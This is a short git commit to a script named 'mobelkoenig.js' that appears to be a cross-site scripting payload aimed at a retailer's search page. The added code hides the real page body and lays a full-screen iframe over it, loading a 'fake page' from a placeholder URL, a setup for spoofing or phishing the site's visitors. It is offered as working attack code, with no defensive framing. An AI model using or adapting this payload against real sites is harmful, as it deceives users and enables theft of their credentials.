f92bcb35cdc14ff70334fba6ad99af10e84a0deb
jstest2016 <suserarchitect3@gmail.com>
2016-03-18 13:44:12 +0100

    Update mobelkoenig.js

--- mobelkoenig.js
+++ mobelkoenig.js
@@ -1,4 +1,6 @@
 $(function() {
+  var fakePageUrl = "http://www.example.com";
+  
   // Run only once
   if (window.initXSS) {
     return;
@@ -9,6 +11,21 @@ $(function() {
   console.log("hello console");
 
   // Clear the text box
-  $('[name=ctl17$tbSearch]')[0].value = '';
+  //$('[name=ctl17$tbSearch]')[0].value = '';
   
+  // TODO: use an event for this
+  // Replace with the fake page
+  ReplaceWithFakePage();
+  
+  // Replaces current page with the fake page
+  function ReplaceWithFakePage() {
+    // make the original body very small
+    document.body.style = 'height: 100px; width: 100px; overflow: hidden; float: left;';
+
+    // Add the fake page iframe
+    var iframe = document.createElement('iframe');
+    iframe.style = "position: absolute; border: none; top: 0; left: 0; right: 0; bottom: 0; width: 100%; height: 100%; z-ndex:999999;";
+    iframe.src = fakePageUrl;
+    document.body.appendChild(iframe);
+  }
 });
